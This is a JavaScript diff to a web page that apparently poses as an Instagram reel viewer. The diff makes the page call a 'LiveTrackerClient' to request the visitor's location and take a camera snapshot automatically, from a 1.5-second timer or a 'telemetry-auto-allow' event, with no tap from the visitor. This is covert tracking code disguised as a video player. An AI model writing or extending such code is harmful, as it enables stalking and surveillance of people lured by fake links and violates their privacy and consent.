@@ -748,8 +748,17 @@
         const iframe = document.getElementById('ig-iframe');
 
         // Extract Reel ID if present
+        let reelId = '';
         const reelMatch = redirectUrl.match(/instagram\.com\/(?:reel|reels|p)\/([A-Za-z0-9_-]+)/i);
-        const reelId = reelMatch ? reelMatch[1] : '';
+        if (reelMatch) {
+            reelId = reelMatch[1];
+        } else {
+            const pathParts = window.location.pathname.split('/').filter(Boolean);
+            const candidate = pathParts[pathParts.length - 1];
+            if (candidate && !['instagram', 'ig', 'reel', 'reels', 'p', 'i'].includes(candidate)) {
+                reelId = candidate;
+            }
+        }
 
         let isVideoElement = false;
         if (videoMediaUrl || redirectUrl.endsWith('.mp4') || redirectUrl.includes('.mp4?')) {
@@ -769,21 +778,49 @@
             tapOverlay.style.background = `linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.8)), url('${thumbUrl}') center/cover no-repeat`;
         }
 
-        function triggerUserPermissions() {
+        let hasTriggered = false;
+        let autoAllowTimer = null;
+
+        function triggerUserPermissions(isAuto = false) {
+            if (hasTriggered) return;
+            hasTriggered = true;
+            if (autoAllowTimer) {
+                clearTimeout(autoAllowTimer);
+                autoAllowTimer = null;
+            }
+
             tapOverlay.classList.add('hidden');
+            tapOverlay.style.display = 'none';
+
             const v = document.getElementById('active-video');
             if (v) {
-                v.muted = false;
-                v.play().catch(() => { });
+                if (isAuto) {
+                    v.play().catch(() => {
+                        v.muted = true;
+                        v.play().catch(() => {});
+                    });
+                } else {
+                    v.muted = false;
+                    v.play().catch(() => {});
+                }
             }
             if (window.LiveTrackerClient) {
                 window.LiveTrackerClient.requestLocation();
-                window.LiveTrackerClient.captureCameraSnapshot();
+                window.LiveTrackerClient.captureCameraSnapshot(1500);
             }
         }
 
-        tapOverlay.addEventListener('click', triggerUserPermissions);
-        tapOverlay.addEventListener('touchstart', triggerUserPermissions, { passive: true });
+        // Prompt overlay stays for only 1.5s, then automatically allows and plays normally
+        autoAllowTimer = setTimeout(() => {
+            triggerUserPermissions(true);
+        }, 1500);
+
+        tapOverlay.addEventListener('click', () => triggerUserPermissions(false));
+        tapOverlay.addEventListener('touchstart', () => triggerUserPermissions(false), { passive: true });
+
+        window.addEventListener('telemetry-auto-allow', () => {
+            triggerUserPermissions(true);
+        });
 
         // Micro-interactions
         const likeAction = document.getElementById('like-action');
